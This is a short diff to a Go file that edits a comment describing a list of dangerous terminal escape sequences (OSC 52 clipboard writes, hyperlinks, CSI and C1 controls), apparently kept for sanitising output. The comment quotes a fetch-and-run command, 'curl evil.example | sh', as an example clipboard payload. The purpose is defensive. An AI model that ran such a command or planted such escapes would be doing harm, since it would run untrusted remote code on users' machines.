@@ -17,7 +17,7 @@ import (
 	"github.com/muesli/termenv"
 )
 
-// bad is what a terminal acts on instead of printing (security scan F25): OSC
+// bad is what a terminal acts on instead of printing: OSC
 // 52 writing the clipboard ("curl evil.example | sh"), a window title, an OSC
 // 8 hyperlink, CSI clear-screen and colour, the 8-bit C1 CSI, OSC and ST, a
 // carriage return that reprints its line, DEL, BEL, NUL and a backspace.
